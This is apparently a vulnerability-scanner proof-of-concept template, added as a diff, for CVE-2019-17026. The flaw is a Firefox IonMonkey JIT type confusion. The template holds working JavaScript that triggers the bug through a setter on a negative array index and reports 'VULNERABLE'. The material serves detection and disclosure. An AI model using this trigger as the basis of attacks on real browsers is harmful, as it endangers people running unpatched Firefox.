@@ -1,0 +1,73 @@
+[info]
+author = "ave"
+description = "通过特制 JavaScript 触发 Firefox IonMonkey JIT 编译器类型混淆漏洞。利用 JIT 对 StoreElementHole 和 FallibleStoreElement 操作的类型别名信息处理错误，在数组负索引写入时意外触发 setter，导致 JIT 编译器未重新获取变量值而返回错误结果，验证类型混淆的存在。"
+id = "POC-AVE-2019-0900"
+name = "Mozilla Firefox IonMonkey JIT 类型混淆 PoC"
+severity = "high"
+tags = [
+    "cve-2019-17026",
+    "type-confusion",
+    "firefox",
+    "jit",
+]
+vuln_id = [
+    "CVE-2019-17026",
+    "AVE-2019-0900",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html>
+<body>
+<script>
+const NUM_ITERATIONS = 2000;
+const ARRAY_LENGTH = 100;
+let OBJ = { a: 41 };
+OBJ.a = 42;
+let ctr = 0;
+function f(obj, idx) {
+    let v = OBJ.a;
+    obj[idx] = v;
+    return OBJ.a;
+}
+function main() {
+    for(let i = 0; i < NUM_ITERATIONS; i++) {
+        let isLastIteration = i == NUM_ITERATIONS - 1;
+        let length = ARRAY_LENGTH;
+        let idx = isLastIteration ? -1 : ARRAY_LENGTH;
+        let obj = new Array(length);
+        Object.defineProperty(obj, '-1', {
+            set() {
+                OBJ.a = 1337;
+            }
+        });
+        for (let j = 0; j < length; j++) {
+            if (j == length/2) continue;
+            obj[j] = j;
+        }
+        let r = f(obj, idx);
+        if (isLastIteration && r === 1337) {
+            document.title = "VULNERABLE";
+            document.body.innerHTML = "<h1>VULNERABLE: Type Confusion Triggered</h1><p>Expected 42, got " + r + "</p>";
+        }
+    }
+}
+main();
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
